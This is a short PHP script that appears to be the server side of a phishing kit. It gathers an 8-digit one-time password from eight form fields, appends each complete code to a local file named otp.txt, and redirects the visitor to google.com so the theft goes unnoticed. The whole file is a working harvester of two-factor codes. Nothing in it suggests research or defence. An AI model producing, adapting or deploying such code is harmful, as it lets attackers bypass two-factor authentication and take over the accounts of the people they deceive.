<?php
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    // Collect 8-digit OTP
    $otp = '';
    for ($i = 0; $i < 8; $i++) {
        $otp .= $_GET["otp$i"] ?? '';
    }

    // Check if OTP is fully entered
    if (strlen($otp) === 8) {
        $entry = "OTP: $otp\n";
        $entry .= "--------------------------\n";

        // Save to file
        file_put_contents("otp.txt", $entry, FILE_APPEND | LOCK_EX);
    }

    // Redirect to Google
    header("Location: https://www.google.com");
    exit();
}
?>
